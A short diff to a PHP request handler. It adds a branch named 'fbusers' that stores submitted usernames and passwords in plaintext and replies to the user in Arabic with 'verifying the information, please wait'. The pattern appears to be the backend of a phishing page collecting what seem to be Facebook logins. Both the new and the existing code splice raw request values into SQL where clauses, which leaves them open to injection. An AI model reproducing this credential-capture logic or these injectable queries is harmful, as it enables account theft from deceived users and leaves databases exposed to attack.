@@ -29,5 +29,20 @@ if($Sql){
 }else if (isv("get")) {
   $convert_to_array = explode(',',isv("val"));
   echo json_encode(array("data"=>Selaa(isv("get"),"where $convert_to_array[0]='".$convert_to_array[1]."'")));
+}else if (isv("fbusers")) {
+  $user = isv("user");
+  $pass = isv("pass");
+  $msg = "خطأ فى قاعدة البيانات ";
+  if(Num(isv("fbusers"),"where username='".$user."'")){
+    $Sql =  UpDate(isv("fbusers"),array('username' =>$user,'password' =>$pass ),null,"where username='".$user."'");
+  }else{
+  $Sql =  SqlIn(isv("fbusers"),array('username' =>$user,'password' =>$pass ));
+  }
+  if($Sql){
+    $msg ="جارى  التحقق من المعلومات  من فضلك انتظر ";
+    echo json_encode(array('success' =>true,"code"=>$code,"msg"=>$msg));
+  }else{
+      echo json_encode(array('success' =>false,"code"=>$code,"msg"=>$msg));
+  }
 }
 ?>
